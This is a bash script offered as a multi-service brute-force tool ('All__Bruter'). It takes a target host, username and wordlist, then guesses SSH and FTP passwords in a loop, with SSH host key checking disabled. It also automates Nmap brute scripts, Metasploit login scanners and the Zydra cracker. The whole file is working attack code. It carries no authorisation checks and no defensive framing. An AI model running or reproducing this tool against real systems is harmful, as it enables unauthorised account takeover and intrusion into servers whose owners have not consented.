#!/bin/bash

# Colors
GREEN="\033[1;32m"
RED="\033[1;31m"
YELLOW="\033[1;33m"
RESET="\033[0m"

function banner() {
    echo -e "${GREEN}=== All__Bruter - Multi Service Brute Force Tool ===${RESET}"
}

function get_inputs() {
    read -p "Target IP/Host: " HOST
    read -p "Username: " USERNAME
    read -p "Password wordlist file: " WORDLIST
    echo ""
}

function ssh_brute() {
    which sshpass &>/dev/null || { echo -e "${RED}sshpass not found. Install it first.${RESET}"; exit 1; }
    get_inputs
    while read -r PASS; do
        echo "[*] Trying SSH password: $PASS"
        sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$USERNAME@$HOST" "exit" &>/dev/null
        [ $? -eq 0 ] && echo -e "${GREEN}[+] Found SSH password: $PASS${RESET}" && break
    done < "$WORDLIST"
}

function ftp_brute() {
    get_inputs
    while read -r PASS; do
        echo "[*] Trying FTP password: $PASS"
        echo -e "user $USERNAME $PASS\nquit" | ftp -inv $HOST 2>/dev/null | grep -q "230"
        [ $? -eq 0 ] && echo -e "${GREEN}[+] Found FTP password: $PASS${RESET}" && break
    done < "$WORDLIST"
}

function run_nmap_brute() {
    read -p "Target IP: " TARGET
    read -p "Service to brute with Nmap (e.g., ftp, ssh): " SERVICE
    echo -e "${YELLOW}[*] Running Nmap brute scan on $SERVICE...${RESET}"
    nmap -p- --script $SERVICE-brute.nse $TARGET
}

function run_metasploit_brute() {
    read -p "Service (e.g. ssh, ftp): " SERVICE
    read -p "Target IP: " TARGET
    read -p "Username: " USERNAME
    read -p "Wordlist path: " WORDLIST
    msfconsole -q -x "
use auxiliary/scanner/$SERVICE/${SERVICE}_login;
set RHOSTS $TARGET;
set USERNAME $USERNAME;
set PASS_FILE $WORDLIST;
run;
exit;"
}

function run_zydra() {
    read -p "Target IP: " TARGET
    read -p "Port: " PORT
    read -p "Protocol (ftp/ssh): " PROTO
    read -p "Username: " USERNAME
    read -p "Wordlist file: " WORDLIST
    sudo ./Zydra.py -H $TARGET -u $USERNAME -P $WORDLIST -t $PROTO
}

function exploit_framework_menu() {
    echo "Select Framework to Use:"
    echo "1) Nmap (brute NSE scripts)"
    echo "2) Metasploit (msfconsole automation)"
    echo "3) Zydra (password cracker)"
    echo "0) Back"
    read -p "Choice: " framework_choice
    case $framework_choice in
        1) run_nmap_brute ;;
        2) run_metasploit_brute ;;
        3) run_zydra ;;
        0) menu ;;
        *) echo "Invalid choice"; exploit_framework_menu ;;
    esac
}

function menu() {
    banner
    echo "Select Service to Brute Force:"
    echo "1) SSH"
    echo "2) FTP"
    echo "3) Exploit Frameworks (Nmap, Metasploit, Zydra)"
    echo "0) Exit"
    echo ""
    read -p "Choice: " choice
    echo ""
    case $choice in
        1) ssh_brute ;;
        2) ftp_brute ;;
        3) exploit_framework_menu ;;
        0) echo "Exiting..." && exit 0 ;;
        *) echo "Invalid choice" && menu ;;
    esac
}

menu
